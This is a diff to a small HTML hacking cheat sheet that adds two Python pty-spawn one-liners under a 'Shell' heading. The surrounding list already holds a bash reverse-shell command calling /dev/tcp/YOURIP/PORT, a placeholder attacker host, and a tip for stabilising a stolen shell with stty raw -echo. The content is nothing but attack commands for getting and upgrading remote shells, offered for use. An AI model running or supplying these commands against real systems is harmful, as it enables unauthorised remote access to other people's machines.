@@ -36,6 +36,8 @@ usefull tips and tools for hacking
     
 <b>Shell</b>
 <ul>
+  <li> python -c 'import pty; pty.spawn("/bin/sh")'
+  <li> python -c 'import pty; pty.spawn("/bin/bash")'
   <li> bash -c 'bash -i >& /dev/tcp/YOURIP/PORT 0>&1'
   <li> when having a shell type CTRL-Z to background the shell. then type stty raw -echo and then fg
 </ul>
